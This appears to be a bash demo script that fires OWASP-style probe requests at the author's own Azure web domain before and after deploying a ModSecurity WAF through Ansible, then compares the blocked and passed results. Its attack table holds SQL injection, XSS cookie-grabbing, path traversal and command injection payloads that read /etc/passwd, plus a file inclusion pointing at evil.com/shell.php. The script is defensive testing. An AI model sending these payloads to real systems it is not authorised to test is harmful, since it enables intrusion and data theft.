#!/usr/bin/env bash
# ============================================================
# demo-4-modsecurity.sh
# Demonstrates ModSecurity WAF — OWASP attack blocked before/after
#
# Usage (from ~/ansible/):
#   ./scripts/demo-4-modsecurity.sh
# ============================================================

set -euo pipefail

DOMAIN="mediasrl.swedencentral.cloudapp.azure.com"
ANSIBLE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
DEMO_DIR="${ANSIBLE_DIR}/logs/security-demos"
BEFORE_FILE="${DEMO_DIR}/modsecurity-before.txt"
AFTER_FILE="${DEMO_DIR}/modsecurity-after.txt"
TARGET_HOST="vm-web-01"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

mkdir -p "$DEMO_DIR"
cd "$ANSIBLE_DIR"

banner() {
    echo -e "\n${CYAN}${BOLD}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║  $1${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════╝${NC}\n"
}

log()  { echo -e "${GREEN}[$(date +%H:%M:%S)] $*${NC}"; }
warn() { echo -e "${YELLOW}[$(date +%H:%M:%S)] $*${NC}"; }

run_attack_tests() {
    local label="$1"
    local output_file="$2"

    echo "  === OWASP Attack Tests — ${label} ===" | tee "$output_file"
    echo "  Target: https://${DOMAIN}" | tee -a "$output_file"
    echo "" | tee -a "$output_file"

    declare -A ATTACKS=(
        ["SQL Injection (UNION)"]="/?id=1+UNION+SELECT+1,user(),3--"
        ["SQL Injection (OR 1=1)"]="/?search=admin'+OR+'1'='1"
        ["XSS (script tag)"]="/?q=<script>alert(document.cookie)</script>"
        ["XSS (img onerror)"]="/?name=<img+src=x+onerror=alert(1)>"
        ["Path Traversal"]="/?file=../../../../etc/passwd"
        ["Remote File Inclusion"]="/?page=http://evil.com/shell.php"
        ["Command Injection"]="/?cmd=;cat+/etc/passwd"
        ["Scanner (phpinfo)"]="/phpinfo.php"
    )

    for attack_name in "${!ATTACKS[@]}"; do
        PAYLOAD="${ATTACKS[$attack_name]}"
        URL="https://${DOMAIN}${PAYLOAD}"
        CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time 10 \
            --insecure \
            "$URL" 2>/dev/null || echo "000")

        if [[ "$CODE" == "403" ]]; then
            echo -e "  ${GREEN}[BLOCKED 403]${NC} ${attack_name}" | tee -a "$output_file"
        elif [[ "$CODE" =~ ^(200|301|302|404)$ ]]; then
            echo -e "  ${RED}[PASSED ${CODE}]${NC}  ${attack_name}  ← NOT BLOCKED" | tee -a "$output_file"
        else
            echo -e "  ${YELLOW}[${CODE}]${NC}       ${attack_name}" | tee -a "$output_file"
        fi
    done
}

# ── BEFORE ────────────────────────────────────────────────────────────────────

banner "STEP 1 — BEFORE: No WAF — all OWASP attacks pass through"
warn "SQL injection, XSS, path traversal etc. reach the application backend"
echo ""
run_attack_tests "BEFORE (no WAF)" "$BEFORE_FILE"

# ── APPLY HARDENING ───────────────────────────────────────────────────────────

banner "STEP 2 — Deploying ModSecurity WAF via Ansible"
warn "This may take 2-3 minutes (downloads OWASP CRS ~25MB)"
log "Running: ansible-playbook playbooks/5-harden-security.yml --tags modsecurity"
echo ""

ansible-playbook playbooks/5-harden-security.yml \
    --tags modsecurity \
    2>&1 | grep -E "(TASK|ok|changed|failed|PLAY RECAP|fatal)" | sed 's/^/  /'

echo ""
log "ModSecurity deployed. Waiting 8s for nginx reload..."
sleep 8

# ── AFTER ─────────────────────────────────────────────────────────────────────

banner "STEP 3 — AFTER: ModSecurity WAF active — OWASP CRS enforcing"
log "SecRuleEngine On — attacks blocked with HTTP 403 Forbidden"
echo ""
run_attack_tests "AFTER (ModSecurity + OWASP CRS)" "$AFTER_FILE"

# Show audit log entries
echo ""
banner "STEP 3b — ModSecurity Audit Log (last 5 blocked events)"
ansible "${TARGET_HOST}" -m shell \
    -a "tail -50 /var/log/nginx/modsec_audit.log 2>/dev/null | python3 -c \"
import sys, json
for line in sys.stdin:
    try:
        j = json.loads(line)
        print(f\\\"  [{j.get('timestamp','?')}] {j.get('request',{}).get('uri','?')} → Rule {j.get('response',{}).get('status','?')}\\\")
    except: pass
\" 2>/dev/null | head -10 || echo '  (audit log not yet populated or not in JSON format)'" \
    --become 2>/dev/null | grep -v "^$\|WARNING\|SUCCESS" | head -15 || \
    echo "  (check log manually: tail -f /var/log/nginx/modsec_audit.log)"

# ── DIFF ──────────────────────────────────────────────────────────────────────

banner "STEP 4 — DIFF: Before vs After"
echo -e "${YELLOW}--- BEFORE (attacks PASS)${NC}"
echo -e "${GREEN}+++ AFTER  (attacks BLOCKED)${NC}"
echo ""
diff --color=always "$BEFORE_FILE" "$AFTER_FILE" || true

echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║  DEMO COMPLETE — ModSecurity WAF                     ║${NC}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Test manually:"
echo -e "    curl -k \"https://${DOMAIN}/?id=1+UNION+SELECT+1,2,3--\""
echo -e "    # Expected: 403 Forbidden"
echo ""
echo -e "  Watch WAF blocks live:"
echo -e "    ssh azureadmin@vm-web-01 'sudo tail -f /var/log/nginx/modsec_audit.log'"
